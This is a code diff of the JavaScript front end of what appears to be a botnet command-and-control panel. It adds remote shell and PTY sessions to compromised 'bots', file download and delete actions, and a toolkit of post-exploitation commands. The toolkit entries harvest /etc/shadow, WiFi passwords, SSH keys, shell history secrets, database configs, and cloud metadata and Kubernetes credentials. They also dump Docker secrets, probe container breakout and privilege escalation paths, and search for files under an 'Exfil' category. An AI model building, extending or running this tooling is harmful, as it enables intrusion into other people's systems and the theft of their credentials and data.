     if (e.isDir) {
       cls += ' fe-dir'; icon = '&#128193;';
       click = 'onclick="shellCd(\'' + eName + '\')"';
@@ -2682,7 +2877,7 @@ function parseFileList(output) {
       dlBtn = '<span class="file-dl-btn" onclick="event.stopPropagation();shellDownloadFile(\'' + eName + '\')" title="Download">&#8681;</span>';
     }
     var sizeHtml = e.size ? '<span class="file-size">' + e.size + '</span>' : '';
-    html += '<div class="' + cls + '" ' + click + '><span class="file-icon">' + icon + '</span><span>' + escHtml(e.name) + (e.isDir ? '/' : '') + '</span>' + sizeHtml + dlBtn + '</div>';
+    html += '<div class="' + cls + '" ' + click + ' ' + ctx + '><span class="file-icon">' + icon + '</span><span>' + escHtml(e.name) + (e.isDir ? '/' : '') + '</span>' + sizeHtml + dlBtn + '</div>';
   });
   wrap.innerHTML = html;
 }
@@ -2691,9 +2886,96 @@ function shellSendCmd(cmd) {
   if (!shellWS || shellWS.readyState !== 1) return;
   var p = document.getElementById('shell-prompt').textContent;
   appendOutput(p + ' ' + cmd + '\n');
-  shellWS.send(JSON.stringify({ command: cmd }));
+  var useStream = !cmd.match(/^!/) && !cmd.match(/^cd(\s|$)/);
+  shellWS.send(JSON.stringify({ command: cmd, stream: useStream }));
   shellHistory.push(cmd);
   shellHistIdx = shellHistory.length;
+  shellCmdLog.push({ ts: Date.now(), cmd: cmd });
+  renderHistoryPanel();
+}
+
+// Background shell session helpers
+// ---------------------------------------------------------------------------
+
+function makeBgMessageHandler(botID) {
+  return function (e) {
+    try {
+      var d = JSON.parse(e.data);
+      if (!d) return;
+      if (d.type === 'file' && d.name && d.data) {
+        // Trigger download even while backgrounded — user already requested it
+        shellTriggerDownload(d.name, d.data);
+        return;
+      }
+      // Handle streaming output in background — accumulate into session
+      if (d.type === 'stream_stdout' || d.type === 'stream_stderr') {
+        if (!shellSessions[botID]) {
+          shellSessions[botID] = { output: '', cmds: [], cwd: '/', cmdLog: [] };
+        }
+        var span = document.createElement('span');
+        if (d.type === 'stream_stderr') span.style.color = 'var(--red, #f44)';
+        span.textContent = d.output || '';
+        shellSessions[botID].output += span.outerHTML;
+        return;
+      }
+      if (d.output) {
+        if (!shellSessions[botID]) {
+          shellSessions[botID] = { output: '', cmds: [], cwd: '/', cmdLog: [] };
+        }
+        // Append to stored HTML — same escaping as appendOutput plain-text path
+        var span = document.createElement('span');
+        span.textContent = d.output;
+        shellSessions[botID].output += span.outerHTML;
+        // Track cwd changes in background too
+        var trimmed = d.output.trim();
+        if (trimmed.match(/^\/[^\n]*$/) && !trimmed.match(/\s/)) {
+          shellSessions[botID].cwd = trimmed;
+        }
+      }
+    } catch (ex) { }
+  };
+}
+
+function updateBgIndicators() {
+  document.querySelectorAll('.bot-row').forEach(function (row) {
+    var bid = row.getAttribute('data-botid');
+    var active = shellBgSessions[bid] && shellBgSessions[bid].readyState === 1;
+    row.classList.toggle('shell-bg-active', !!active);
+  });
+}
+
+// ---------------------------------------------------------------------------
+function shellCtrlC() {
+  var inp = document.getElementById('shell-input');
+  if (inp.value) {
+    appendOutput(inp.value + ' ^C\n');
+    inp.value = '';
+  } else {
+    appendOutput('^C\n');
+    // Reset streaming state without killing the connection
+    shellStreamActive = 0;
+    updateStreamIndicator();
+    // If WS is dead or stuck, reconnect transparently
+    if (!shellWS || shellWS.readyState !== 1) {
+      _shellReconnect();
+    }
+  }
+  inp.focus();
+}
+
+function _shellReconnect() {
+  if (shellWS) { shellWS.close(); shellWS = null; }
+  if (!shellBotID) return;
+  var proto = location.protocol === 'https:' ? 'wss:' : 'ws:';
+  shellWS = new WebSocket(proto + '//' + location.host + '/ws/shell?botID=' + encodeURIComponent(shellBotID));
+  shellWS.onmessage = _shellOnMsg;
+  shellWS.onclose = function () { appendOutput('\n[Connection closed]\n'); };
+  shellWS.onopen = function () {
+    appendOutput('[Reconnected]\n');
+    var dir = (shellCwd && shellCwd !== '~') ? shellCwd : '/';
+    pendingFileRefresh = true;
+    shellWS.send(JSON.stringify({ command: 'ls -laF ' + dir }));
+  };
 }
 
 // ---------------------------------------------------------------------------
@@ -2719,6 +3001,116 @@ function renderInfoSidebar(b) {
     '<div class="isb-row"><span class="isb-label">SOCKS</span><span class="isb-val" style="color:' + (b.socksActive ? 'var(--green)' : 'var(--text-dim)') + '">' + (b.socksActive ? 'ON' : 'OFF') + '</span></div>' +
     (b.socksActive && b.socksRelay ? '<div class="isb-row"><span class="isb-label">Relay</span><span class="isb-val" style="color:var(--accent)">' + escHtml(b.socksRelay) + '</span></div>' : '');
 }
+
+// ---------------------------------------------------------------------------
+// Sidebar tabs (Info / History)
+// ---------------------------------------------------------------------------
+
+function switchSidebarTab(idx) {
+  document.getElementById('isb-tab-info').classList.toggle('isb-tab-active', idx === 0);
+  document.getElementById('isb-tab-hist').classList.toggle('isb-tab-active', idx === 1);
+  document.getElementById('info-sidebar-body').style.display = idx === 0 ? '' : 'none';
+  document.getElementById('info-sidebar-hist').style.display = idx === 1 ? 'flex' : 'none';
+  if (idx === 1) renderHistoryPanel();
+}
+
+function renderHistoryPanel() {
+  var list = document.getElementById('hist-list');
+  if (!list) return;
+  var q = (document.getElementById('hist-search') || {}).value || '';
+  q = q.toLowerCase();
+  var items = shellCmdLog.filter(function (h) { return !q || h.cmd.toLowerCase().indexOf(q) !== -1; });
+  if (!items.length) { list.innerHTML = '<div style="padding:10px;font-size:11px;color:var(--text-dim);text-align:center">' + (q ? 'No matches' : 'No history yet') + '</div>'; return; }
+  var html = '';
+  for (var i = items.length - 1; i >= 0; i--) {
+    var h = items[i];
+    var d = new Date(h.ts);
+    var ts = d.getHours().toString().padStart(2, '0') + ':' + d.getMinutes().toString().padStart(2, '0') + ':' + d.getSeconds().toString().padStart(2, '0');
+    var ec = h.cmd.replace(/\\/g, '\\\\').replace(/'/g, "\\'");
+    html += '<div class="hist-item" onclick="shellHistInsert(\'' + ec + '\')">' +
+      '<div class="hist-ts">' + ts + '<span class="hist-rerun">&#9654; Run</span></div>' +
+      '<div class="hist-cmd">' + escHtml(h.cmd) + '</div></div>';
+  }
+  list.innerHTML = html;
+}
+
+function shellHistInsert(cmd) {
+  var inp = document.getElementById('shell-input');
+  inp.value = cmd;
+  inp.focus();
+  switchSidebarTab(0); // switch back to info so terminal is accessible
+}
+
+// ---------------------------------------------------------------------------
+// File context menu
+// ---------------------------------------------------------------------------
+
+function showFileCtx(e, name, isDir) {
+  _ctxEntry = { name: name, isDir: isDir, cwd: shellCwd };
+  var m = document.getElementById('file-ctx-menu');
+  // Show/hide dir-only vs file-only items
+  document.getElementById('ctx-cd-item').style.display = isDir ? '' : 'none';
+  document.getElementById('ctx-pty-item').style.display = (isDir && !ptyMode) ? '' : 'none';
+  document.getElementById('ctx-cat-item').style.display = !isDir ? '' : 'none';
+  document.getElementById('ctx-dl-item').style.display = !isDir ? '' : 'none';
+  document.getElementById('ctx-chmod-item').style.display = !isDir ? '' : 'none';
+  // Position
+  var x = e.clientX, y = e.clientY;
+  if (x + 170 > window.innerWidth) x = window.innerWidth - 175;
+  if (y + 220 > window.innerHeight) y = window.innerHeight - 225;
+  m.style.left = x + 'px'; m.style.top = y + 'px'; m.style.display = 'block';
+  e.stopPropagation();
+}
+
+function hideFileCtx() { document.getElementById('file-ctx-menu').style.display = 'none'; }
+document.addEventListener('click', hideFileCtx);
+document.addEventListener('keydown', function (e) { if (e.key === 'Escape') hideFileCtx(); });
+
+function ctxPath() {
+  if (!_ctxEntry) return '';
+  var base = _ctxEntry.cwd === '~' ? '' : _ctxEntry.cwd;
+  return (base ? base + '/' : '') + _ctxEntry.name;
+}
+function ctxCopyPath() {
+  var p = ctxPath();
+  try { navigator.clipboard.writeText(p); } catch (e) { }
+  showToast('Copied: ' + p, true);
+  hideFileCtx();
+}
+function ctxCd() { shellCd(_ctxEntry.name); hideFileCtx(); }
+function ctxOpenPty() {
+  hideFileCtx();
+  if (ptyMode) return;
+  // Enter PTY mode then cd into the directory
+  enterPtyMode();
+  // Wait for PTY_OPENED then send cd command
+  setTimeout(function () {
+    var dir = ctxPath();
+    if (shellWS && shellWS.readyState === 1) {
+      var cdCmd = 'cd ' + dir.replace(/'/g, "'\\\\''") + '\r';
+      var b64 = btoa(cdCmd);
+      shellWS.send(JSON.stringify({ type: 'pty_input', data: cdCmd }));
+    }
+  }, 600);
+}
+function ctxCat() { shellSendCmd('cat ' + shellQuoteJs(_ctxEntry.name)); hideFileCtx(); }
+function ctxDownload() { shellDownloadFile(_ctxEntry.name); hideFileCtx(); }
+function ctxChmod() { shellSendCmd('chmod +x ' + shellQuoteJs(_ctxEntry.name)); hideFileCtx(); }
+function ctxDelete() {
+  if (!confirm('Delete ' + _ctxEntry.name + '?')) { hideFileCtx(); return; }
+  shellSendCmd((_ctxEntry.isDir ? 'rm -rf ' : 'rm -f ') + shellQuoteJs(_ctxEntry.name));
+  hideFileCtx();
+  setTimeout(refreshFiles, 800);
+}
+function ctxRename() {
+  var n = prompt('Rename to:', _ctxEntry.name);
+  hideFileCtx();
+  if (n && n !== _ctxEntry.name) {
+    shellSendCmd('mv ' + shellQuoteJs(_ctxEntry.name) + ' ' + shellQuoteJs(n));
+    setTimeout(refreshFiles, 800);
+  }
+}
+function shellQuoteJs(s) { return "'" + s.replace(/'/g, "'\\''") + "'"; }
 
 // ---------------------------------------------------------------------------
 // Tab completion
@@ -2765,6 +3157,51 @@ function navigateTabComplete(dir) {
 // Shell action buttons
 // ---------------------------------------------------------------------------
 
+// ---------------------------------------------------------------------------
+// Shell resize / zoom / maximize
+// ---------------------------------------------------------------------------
+
+var _shellFontSize = 13;
+function shellZoom(delta) {
+  _shellFontSize = Math.max(9, Math.min(22, _shellFontSize + delta));
+  document.querySelectorAll('.shell-output').forEach(function (el) {
+    el.style.fontSize = _shellFontSize + 'px';
+  });
+}
+
+function toggleShellMaximize() {
+  var modal = document.querySelector('.shell-modal');
+  if (!modal) return;
+  var isMax = modal.classList.toggle('shell-maximized');
+  var btn = document.getElementById('shell-max-btn');
+  if (btn) btn.title = isMax ? 'Restore' : 'Maximize';
+  if (!isMax) { modal.style.width = ''; modal.style.height = ''; }
+}
+
+function initShellResize() {
+  var handle = document.getElementById('shell-resize-handle');
+  if (!handle || handle._resizeInited) return;
+  handle._resizeInited = true;
+  handle.addEventListener('mousedown', function (e) {
+    var modal = document.querySelector('.shell-modal');
+    if (!modal) return;
+    var sx = e.clientX, sy = e.clientY, sw = modal.offsetWidth, sh = modal.offsetHeight;
+    e.preventDefault();
+    function onMove(e) {
+      modal.classList.remove('shell-maximized');
+      modal.style.width = Math.max(480, sw + (e.clientX - sx)) + 'px';
+      modal.style.height = Math.max(320, sh + (e.clientY - sy)) + 'px';
+      modal.style.maxWidth = 'none'; modal.style.maxHeight = 'none';
+    }
+    function onUp() {
+      document.removeEventListener('mousemove', onMove);
+      document.removeEventListener('mouseup', onUp);
+    }
+    document.addEventListener('mousemove', onMove);
+    document.addEventListener('mouseup', onUp);
+  });
+}
+
 function copyShellOutput() {
   var text = document.getElementById('shell-output').textContent;
   if (!text) { showToast('Nothing to copy', false); return; }
@@ -2785,10 +3222,192 @@ function saveShellHistory() {
 function clearShellHistory() {
   document.getElementById('shell-output').innerHTML = '';
   document.getElementById('file-list').innerHTML = '<div class="file-empty">Send a command to populate</div>';
-  shellHistory = []; shellHistIdx = 0; shellCwd = '~';
-  document.getElementById('shell-prompt').textContent = '~$ ';
+  shellHistory = []; shellHistIdx = 0; shellCmdLog = [];
+  shellCwd = '/';
+  document.getElementById('shell-prompt').textContent = '/$ ';
   updateBreadcrumb();
   if (shellBotID) delete shellSessions[shellBotID];
+  renderHistoryPanel();
+  // Re-populate file browser from /
+  if (shellWS && shellWS.readyState === 1) {
+    pendingFileRefresh = true;
+    shellWS.send(JSON.stringify({ command: 'ls -laF /' }));
+  }
+}
+
+// ---------------------------------------------------------------------------
+// PTY MODE — Full interactive terminal via xterm.js
+// ---------------------------------------------------------------------------
+
+var ptyMode = false;
+var ptyTerm = null;
+var ptyFitAddon = null;
+var ptyDefaultMode = lsGet('ptyDefault') === true;
+
+// Init PTY default button state
+(function () {
+  var btn = document.getElementById('pty-default-btn');
+  if (btn && ptyDefaultMode) { btn.classList.add('active'); btn.style.color = 'var(--green)'; }
+})();
+
+function togglePtyMode() {
+  if (ptyMode) {
+    exitPtyMode();
+  } else {
+    enterPtyMode();
+  }
+}
+
+function togglePtyDefault() {
+  ptyDefaultMode = !ptyDefaultMode;
+  lsSet('ptyDefault', ptyDefaultMode);
+  var btn = document.getElementById('pty-default-btn');
+  if (btn) {
+    btn.classList.toggle('active', ptyDefaultMode);
+    btn.style.color = ptyDefaultMode ? 'var(--green)' : '';
+  }
+  showToast('PTY default: ' + (ptyDefaultMode ? 'ON' : 'OFF'), true);
+}
+
+function enterPtyMode() {
+  if (!shellWS || shellWS.readyState !== 1) {
+    showToast('No WebSocket connection', false);
+    return;
+  }
+
+  ptyMode = true;
+  var btn = document.getElementById('pty-toggle-btn');
+  if (btn) { btn.classList.add('active'); btn.style.color = 'var(--green)'; }
+
+  // Hide normal shell UI, show xterm container
+  document.getElementById('shell-output').style.display = 'none';
+  document.getElementById('shell-input-row').style.display = 'none';
+  var ptyEl = document.getElementById('pty-terminal');
+  ptyEl.style.display = 'block';
+
+  // Initialize xterm.js
+  if (!ptyTerm) {
+    var currentShellTheme = SHELL_THEMES[localStorage.getItem('armada_shell_theme') || 'default'] || SHELL_THEMES['default'];
+    ptyTerm = new Terminal({
+      cursorBlink: true,
+      fontSize: 14,
+      fontFamily: "'JetBrains Mono', 'Fira Code', 'Cascadia Code', monospace",
+      theme: {
+        background: currentShellTheme.bg,
+        foreground: currentShellTheme.fg,
+        cursor: currentShellTheme.cursor,
+        selectionBackground: currentShellTheme.bg === '#ffffff' ? '#b4d7ff' : '#264f78',
+        black: currentShellTheme.black,
+        red: currentShellTheme.red,
+        green: currentShellTheme.green,
+        yellow: currentShellTheme.yellow,
+        blue: currentShellTheme.blue,
+        magenta: currentShellTheme.magenta,
+        cyan: currentShellTheme.cyan,
+        white: currentShellTheme.white
+      },
+      scrollback: 5000,
+      convertEol: false
+    });
+    ptyFitAddon = new FitAddon.FitAddon();
+    ptyTerm.loadAddon(ptyFitAddon);
+    ptyTerm.open(ptyEl);
+    ptyFitAddon.fit();
+
+    // Send keyboard input to bot via WebSocket
+    ptyTerm.onData(function (data) {
+      if (shellWS && shellWS.readyState === 1) {
+        shellWS.send(JSON.stringify({ type: 'pty_input', data: data }));
+      }
+    });
+
+    // Enable browser paste (Ctrl+V / right-click) into PTY
+    ptyTerm.attachCustomKeyEventHandler(function (ev) {
+      // Allow Ctrl+V / Cmd+V to trigger browser paste
+      if ((ev.ctrlKey || ev.metaKey) && ev.key === 'v' && ev.type === 'keydown') {
+        navigator.clipboard.readText().then(function (text) {
+          if (text && shellWS && shellWS.readyState === 1) {
+            shellWS.send(JSON.stringify({ type: 'pty_input', data: text }));
+          }
+        }).catch(function () { });
+        return false; // prevent xterm from handling it
+      }
+      // Allow Ctrl+C to send through (as interrupt)
+      return true;
+    });
+
+    // Resize handler
+    window.addEventListener('resize', function () {
+      if (ptyMode && ptyFitAddon) ptyFitAddon.fit();
+    });
+  } else {
+    ptyFitAddon.fit();
+  }
+
+  ptyTerm.clear();
+  ptyTerm.focus();
+
+  // Request PTY session from bot
+  shellWS.send(JSON.stringify({ type: 'pty_open' }));
+}
+
+function exitPtyMode() {
+  ptyMode = false;
+  var btn = document.getElementById('pty-toggle-btn');
+  if (btn) { btn.classList.remove('active'); btn.style.color = ''; }
+
+  // Show normal shell UI, hide xterm container
+  document.getElementById('shell-output').style.display = '';
+  document.getElementById('shell-input-row').style.display = '';
+  document.getElementById('pty-terminal').style.display = 'none';
+
+  // Focus normal input
+  var inp = document.getElementById('shell-input');
+  if (inp) inp.focus();
+}
+
+// Handle PTY messages from WebSocket
+function handlePtyMessage(msg) {
+  if (!ptyTerm) return;
+  switch (msg.type) {
+    case 'pty_output':
+      // msg.data is base64-encoded PTY output
+      try {
+        var raw = atob(msg.data);
+        ptyTerm.write(raw);
+      } catch (e) {
+        // If not valid base64, write as-is
+        ptyTerm.write(msg.data);
+      }
+      break;
+    case 'pty_opened':
+      ptyTerm.write('\r\n\x1b[32m[PTY session opened]\x1b[0m\r\n');
+      break;
+    case 'pty_closed':
+      ptyTerm.write('\r\n\x1b[31m[PTY session closed]\x1b[0m\r\n');
+      break;
+    case 'pty_error':
+      ptyTerm.write('\r\n\x1b[31m[PTY error: ' + (msg.error || 'unknown') + ']\x1b[0m\r\n');
+      break;
+  }
+}
+
+// Paste clipboard contents into PTY
+function shellPtyPaste() {
+  if (!ptyMode || !shellWS || shellWS.readyState !== 1) {
+    // Fallback: paste into normal shell input
+    navigator.clipboard.readText().then(function (text) {
+      var inp = document.getElementById('shell-input');
+      if (inp && text) { inp.value += text; inp.focus(); }
+    }).catch(function () { showToast('Clipboard access denied', false); });
+    return;
+  }
+  navigator.clipboard.readText().then(function (text) {
+    if (text) {
+      shellWS.send(JSON.stringify({ type: 'pty_input', data: text }));
+      if (ptyTerm) ptyTerm.focus();
+    }
+  }).catch(function () { showToast('Clipboard access denied — use Ctrl+Shift+V', false); });
 }
 
 // ---------------------------------------------------------------------------
@@ -2810,6 +3429,10 @@ var toolkitItems = [
   { name: 'Passwd / Shadow', cmd: 'cat /etc/passwd && echo "=== SHADOW ===" && cat /etc/shadow 2>/dev/null || echo "(no read access to shadow)"' },
   { name: 'Env / Secrets', cmd: 'env | grep -iE "pass|key|token|secret|api|auth|cred" 2>/dev/null; echo "=== .env files ===" && find / -name ".env" -readable 2>/dev/null | head -10' },
   { name: 'SSH Config', cmd: 'cat ~/.ssh/config 2>/dev/null; echo "=== Known Hosts ===" && cat ~/.ssh/known_hosts 2>/dev/null | head -20' },
+  { name: 'WiFi Passwords', cmd: 'find /etc/NetworkManager/system-connections/ -name "*.nmconnection" 2>/dev/null | xargs grep -H psk= 2>/dev/null; cat /etc/wpa_supplicant/*.conf 2>/dev/null | grep -A3 "network=" | grep -E "ssid|psk"' },
+  { name: 'History (all shells)', cmd: 'cat ~/.bash_history ~/.zsh_history ~/.ash_history ~/.history 2>/dev/null | grep -iE "pass|token|key|secret|curl.*-u|wget.*--password|mysql.*-p|sshpass" | sort -u | tail -30' },
+  { name: 'Database Configs', cmd: 'cat /etc/mysql/debian.cnf 2>/dev/null; cat /etc/my.cnf 2>/dev/null | grep -i pass; cat /var/www/*/wp-config.php 2>/dev/null | grep -i "DB_"; find / -name "config.php" -path "*/phpmyadmin/*" 2>/dev/null | xargs grep -i "pass" 2>/dev/null | head -10' },
+  { name: 'SNMP Communities', cmd: 'cat /etc/snmp/snmpd.conf 2>/dev/null | grep -v "^#" | grep -i community; cat /etc/snmp/snmp.conf 2>/dev/null' },
   { cat: 'Persistence' },
   { name: 'Crontabs', cmd: 'echo "=== ROOT CRONTAB ===" && crontab -l 2>/dev/null; echo "=== SYSTEM CRON ===" && ls -la /etc/cron.d/ /etc/cron.daily/ /var/spool/cron/crontabs/ 2>/dev/null' },
   { name: 'Systemd Services', cmd: 'systemctl list-units --type=service --state=running 2>/dev/null | head -30 || ls /etc/init.d/ 2>/dev/null' },
@@ -2819,33 +3442,154 @@ var toolkitItems = [
   { name: 'Internal Hosts', cmd: 'cat /etc/hosts && echo "=== KNOWN SSH ===" && cat ~/.ssh/known_hosts 2>/dev/null | awk "{print \\$1}" | sort -u | head -20' },
   { name: 'Docker / LXC', cmd: 'echo "=== DOCKER ===" && docker ps -a 2>/dev/null || echo "(no docker)"; echo "=== LXC ===" && lxc list 2>/dev/null || echo "(no lxc)"; echo "=== CONTAINERS ===" && cat /proc/1/cgroup 2>/dev/null | head -5' },
   { name: 'Network Shares', cmd: 'echo "=== NFS ===" && showmount -e 127.0.0.1 2>/dev/null || echo "(no nfs)"; echo "=== SMB ===" && smbclient -L 127.0.0.1 -N 2>/dev/null || echo "(no smb)"; echo "=== FSTAB ===" && grep -v "^#" /etc/fstab 2>/dev/null' },
+  { name: 'SSH Keys (all users)', cmd: 'find / -name "id_rsa" -o -name "id_ed25519" -o -name "id_ecdsa" -o -name "authorized_keys" 2>/dev/null | while read f; do echo "=== $f ==="; head -2 "$f" 2>/dev/null; echo ""; done | head -50' },
+  { name: 'SSH Agent Sockets', cmd: 'find /tmp -name "agent.*" -type s 2>/dev/null; ls -la /tmp/ssh-* 2>/dev/null; echo "=== ENV ===" && env | grep SSH_AUTH_SOCK' },
+  { name: 'Internal Subnets', cmd: 'ip route 2>/dev/null || route -n 2>/dev/null; echo "=== INTERFACES ===" && ip -4 addr show 2>/dev/null | grep inet | awk "{print \\$2}"' },
+  { name: 'Active Listeners', cmd: 'ss -tulnp 2>/dev/null || netstat -tulnp 2>/dev/null' },
+  { name: 'SSH Config Files', cmd: 'cat /etc/ssh/ssh_config 2>/dev/null | grep -v "^#" | grep -v "^$"; echo "=== USER ===" && cat ~/.ssh/config 2>/dev/null; find /home -name "config" -path "*/.ssh/*" 2>/dev/null | xargs cat 2>/dev/null' },
+  { cat: 'Cloud' },
+  { name: 'AWS IMDSv1', cmd: 'curl -sf --connect-timeout 2 http://169.254.169.254/latest/meta-data/ && echo "" && echo "=== IDENTITY ===" && curl -sf --connect-timeout 2 http://169.254.169.254/latest/dynamic/instance-identity/document && echo "" && echo "=== CREDS ===" && curl -sf --connect-timeout 2 http://169.254.169.254/latest/meta-data/iam/security-credentials/ | xargs -I{} curl -sf http://169.254.169.254/latest/meta-data/iam/security-credentials/{}' },
+  { name: 'AWS IMDSv2', cmd: 'TOKEN=$(curl -sf -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600" 2>/dev/null) && echo "Token: $TOKEN" && curl -sf -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/dynamic/instance-identity/document && echo "" && curl -sf -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/iam/security-credentials/' },
+  { name: 'GCP Metadata', cmd: 'curl -sf -H "Metadata-Flavor: Google" --connect-timeout 2 "http://metadata.google.internal/computeMetadata/v1/?recursive=true&alt=json" 2>/dev/null | python3 -m json.tool 2>/dev/null || curl -sf -H "Metadata-Flavor: Google" --connect-timeout 2 "http://metadata.google.internal/computeMetadata/v1/instance/" 2>/dev/null' },
+  { name: 'GCP Service Acct Token', cmd: 'curl -sf -H "Metadata-Flavor: Google" --connect-timeout 2 "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token" 2>/dev/null && echo "" && curl -sf -H "Metadata-Flavor: Google" --connect-timeout 2 "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/scopes" 2>/dev/null' },
+  { name: 'Azure IMDS', cmd: 'curl -sf -H "Metadata: true" --connect-timeout 2 "http://169.254.169.254/metadata/instance?api-version=2021-02-01" 2>/dev/null | python3 -m json.tool 2>/dev/null; echo "=== MSI TOKEN ===" && curl -sf -H "Metadata: true" --connect-timeout 2 "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/" 2>/dev/null' },
+  { name: 'Cloud Provider Check', cmd: 'echo "=== CHECKING CLOUD PROVIDER ===" && curl -sf --connect-timeout 1 http://169.254.169.254/latest/meta-data/ami-id 2>/dev/null && echo "AWS" || true; curl -sf --connect-timeout 1 -H "Metadata-Flavor: Google" http://metadata.google.internal/ 2>/dev/null && echo "GCP" || true; curl -sf --connect-timeout 1 -H "Metadata: true" "http://169.254.169.254/metadata/instance?api-version=2021-01-01" 2>/dev/null && echo "Azure" || true; [ -f /sys/hypervisor/uuid ] && echo "Xen/AWS" || true' },
+  { name: 'AWS CLI Keys', cmd: 'cat ~/.aws/credentials 2>/dev/null; cat ~/.aws/config 2>/dev/null; find / -name "credentials" -path "*/.aws/*" 2>/dev/null | xargs cat 2>/dev/null' },
+  { name: 'K8s Service Account', cmd: 'echo "=== K8S TOKEN ===" && cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null | cut -c1-80; echo "" && echo "=== NAMESPACE ===" && cat /var/run/secrets/kubernetes.io/serviceaccount/namespace 2>/dev/null && echo "=== API SERVER ===" && env | grep -i kube' },
+  { name: 'K8s API Enum', cmd: 'TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null) && APISERVER="https://${KUBERNETES_SERVICE_HOST}:${KUBERNETES_SERVICE_PORT}" && curl -sf --cacert /var/run/secrets/kubernetes.io/serviceaccount/ca.crt -H "Authorization: Bearer $TOKEN" "$APISERVER/api/v1/namespaces" 2>/dev/null | python3 -m json.tool 2>/dev/null | grep name | head -20' },
+  { name: 'Container Escape Check', cmd: 'echo "=== PRIVILEGED ===" && cat /proc/self/status | grep -i cap; echo "=== DOCKER SOCKET ===" && ls -la /var/run/docker.sock 2>/dev/null || echo "(no docker socket)"; echo "=== HOST MOUNTS ===" && cat /proc/mounts | grep -v tmpfs | grep -v cgroup; echo "=== CGROUP ===" && cat /proc/1/cgroup 2>/dev/null | head -5' },
+  { cat: 'Docker Recon' },
+  { name: 'Docker Enumerate', cmd: 'echo "=== CONTAINERS ===" && docker ps -a --format "table {{.Names}}\\t{{.Image}}\\t{{.Status}}\\t{{.Ports}}" 2>/dev/null; echo "=== IMAGES ===" && docker images --format "table {{.Repository}}\\t{{.Tag}}\\t{{.Size}}" 2>/dev/null; echo "=== NETWORKS ===" && docker network ls 2>/dev/null; echo "=== VOLUMES ===" && docker volume ls 2>/dev/null' },
+  { name: 'Docker Secrets/Envs', cmd: 'for c in $(docker ps -q 2>/dev/null); do echo "=== CONTAINER: $c ==="; docker inspect $c 2>/dev/null | python3 -m json.tool 2>/dev/null | grep -iE "Env|Secret|Password|Key|Token" | head -20; done' },
+  { name: 'Docker via Socket', cmd: 'curl -sf --unix-socket /var/run/docker.sock http://localhost/containers/json 2>/dev/null | python3 -m json.tool 2>/dev/null | grep -E "Id|Image|Status|Names" | head -30 || echo "(no docker socket or no access)"' },
+  { name: 'Docker Breakout (if priv)', cmd: 'echo "=== CHECK PRIVILEGED ===" && cat /proc/self/status | grep CapEff; echo "=== MOUNTED HOST FS ===" && ls /.dockerenv 2>/dev/null && echo "In container" && ls /proc/1/root/ 2>/dev/null | head -10' },
   { cat: 'Privesc' },
   { name: 'SUID Binaries', cmd: 'find / -perm -4000 -type f 2>/dev/null | head -25' },
+  { name: 'SGID Binaries', cmd: 'find / -perm -2000 -type f 2>/dev/null | head -25' },
   { name: 'Writable Dirs', cmd: 'find / -writable -type d 2>/dev/null | grep -v proc | grep -v sys | head -20' },
   { name: 'Sudo Rights', cmd: 'sudo -l 2>/dev/null || echo "(sudo not available)"' },
   { name: 'Capabilities', cmd: 'getcap -r / 2>/dev/null | head -20 || echo "(getcap not found)"' },
   { name: 'World-Writable Files', cmd: 'find /etc /opt /usr -writable -type f 2>/dev/null | head -20' },
+  { name: 'Writable /etc Files', cmd: 'find /etc -writable -type f 2>/dev/null | head -20; echo "=== PASSWD WRITABLE ===" && [ -w /etc/passwd ] && echo "YES — can add user!" || echo "no"' },
+  { name: 'Cron Job Hijack', cmd: 'echo "=== WRITABLE CRON SCRIPTS ===" && find /etc/cron* /var/spool/cron -writable 2>/dev/null | head -10; echo "=== CRON PATH DIRS ===" && cat /etc/crontab 2>/dev/null | grep PATH | tr ":" "\\n" | while read d; do [ -w "$d" ] && echo "WRITABLE: $d"; done' },
+  { name: 'Kernel Exploits', cmd: 'uname -r && echo "=== CHECK ===" && uname -a; cat /proc/version 2>/dev/null; echo "=== DMESG ERR ===" && dmesg 2>/dev/null | grep -i "segfault\\|overflow\\|error" | tail -5' },
+  { name: 'PATH Injection', cmd: 'echo "=== SUID w/ relative cmds ===" && find / -perm -4000 2>/dev/null | while read b; do strings "$b" 2>/dev/null | grep -E "^[a-z]+$" | grep -vE "^(lib|GLIBC)" | head -3 | while read c; do which "$c" >/dev/null 2>&1 || echo "$b calls: $c (not absolute!)"; done; done | head -20' },
+  { name: 'NFS no_root_squash', cmd: 'cat /etc/exports 2>/dev/null | grep -v "^#"; showmount -e 127.0.0.1 2>/dev/null' },
+  { name: 'Doas Config', cmd: 'cat /etc/doas.conf 2>/dev/null || echo "(no doas)"; cat /usr/local/etc/doas.conf 2>/dev/null' },
+  { cat: 'Exfil' },
+  { name: 'Find Interesting Files', cmd: 'find / \\( -name "*.txt" -o -name "*.cfg" -o -name "*.conf" -o -name "*.ini" -o -name "*.json" -o -name "*.yaml" -o -name "*.yml" -o -name "*.bak" \\) -readable 2>/dev/null | grep -iE "pass|key|secret|token|cred|auth|db|database|config" | head -30' },
+  { name: 'Dump All .env Files', cmd: 'find / -name ".env" -readable 2>/dev/null | while read f; do echo "=== $f ==="; cat "$f" 2>/dev/null; done | head -100' },
+  { name: 'Source Code Secrets', cmd: 'find / \\( -name "*.py" -o -name "*.js" -o -name "*.php" -o -name "*.rb" -o -name "*.go" -o -name "*.java" \\) -readable 2>/dev/null | xargs grep -liE "password|api_key|secret_key|access_token|private_key|aws_secret" 2>/dev/null | head -20' },
+  { name: 'Private Keys', cmd: 'find / \\( -name "*.pem" -o -name "*.key" -o -name "*.p12" -o -name "*.pfx" -o -name "id_rsa" -o -name "id_ed25519" -o -name "*.ppk" \\) -readable 2>/dev/null | head -20; find /root /home -name "id_rsa" -o -name "id_ed25519" 2>/dev/null | xargs cat 2>/dev/null | head -40' },
+  { name: 'DB Files (SQLite etc)', cmd: 'find / \\( -name "*.db" -o -name "*.sqlite" -o -name "*.sqlite3" -o -name "*.mdb" \\) -readable 2>/dev/null | head -20' },
